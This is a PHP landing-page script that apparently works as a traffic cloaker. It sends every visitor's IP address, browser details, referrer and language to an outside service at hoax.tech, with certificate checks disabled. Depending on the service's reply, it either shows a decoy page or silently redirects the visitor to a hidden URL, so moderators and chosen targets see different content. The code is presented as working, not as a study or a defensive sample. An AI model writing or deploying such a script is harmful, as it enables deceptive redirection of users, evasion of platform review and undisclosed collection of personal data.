<?php
						$flow_hash = "587e1b3941024a4744a6e52e542ae24b";
						$data["referer"] = "NULL";
						$data["user_agent"] = "NULL";
						$data["utm"] = "NULL";
						$data["langs"] = "NULL";
						$data["ip"] = "NULL";
						$data["clid"] = md5(time().mt_rand());
						$data["url"] = "https://nds-narod.com/novayaKlo";

						if (isset($_POST["userAgent"])){
							$response = curl_send("json_hash",$_POST,$flow_hash);
							if($response == "black"){
								echo $data["url"];
							}
							exit;
						}

						function curl_send($urlstring,$data,$flow_hash){
							$json = json_encode($data); 
							$ch = curl_init();
							curl_setopt($ch, CURLOPT_URL, "https://hoax.tech/get_data?".$urlstring."=".$flow_hash);
							curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type: application/json"));
							curl_setopt($ch, CURLOPT_POST, 1);
							curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
							curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
							curl_setopt($ch, CURLOPT_POSTFIELDS,$json);
							curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
							$response  = curl_exec($ch);
							curl_close($ch);
							return $response;
						}

						function validate_url($cell){
							$url = filter_var($cell, FILTER_SANITIZE_URL);
							if (!filter_var($url, FILTER_VALIDATE_URL) === false) {
								return true;
								}else{
									return false;
								}
							}

							if(!empty($_SERVER["REQUEST_URI"])){
								if($_SERVER["REQUEST_URI"] != "/"){
									$data["utm"] = urldecode($_SERVER["REQUEST_URI"]);
								}
							}

							if(!empty($_SERVER["HTTP_REFERER"])){
								if(validate_url($_SERVER["HTTP_REFERER"])){
									$data["referer"] = parse_url($_SERVER["HTTP_REFERER"], PHP_URL_HOST);
								}
							}

							if(!empty($_SERVER["HTTP_USER_AGENT"])){ 
								$data["user_agent"] = $_SERVER["HTTP_USER_AGENT"];
							}

							if(!empty($_SERVER["HTTP_ACCEPT_LANGUAGE"])){ 
								$data["langs"] = $_SERVER["HTTP_ACCEPT_LANGUAGE"];
							}

							if (filter_var($_SERVER["REMOTE_ADDR"], FILTER_VALIDATE_IP)){
								$data["ip"] = $_SERVER["REMOTE_ADDR"];
							}

							$response = curl_send("hash",$data,$flow_hash);

							if($response == "black"){
								include "assets.php";
								echo "<meta http-equiv='Refresh' content='0.3; url=".$data["url"]."' />";
							}else{
								include "index2.php";
							}
							?>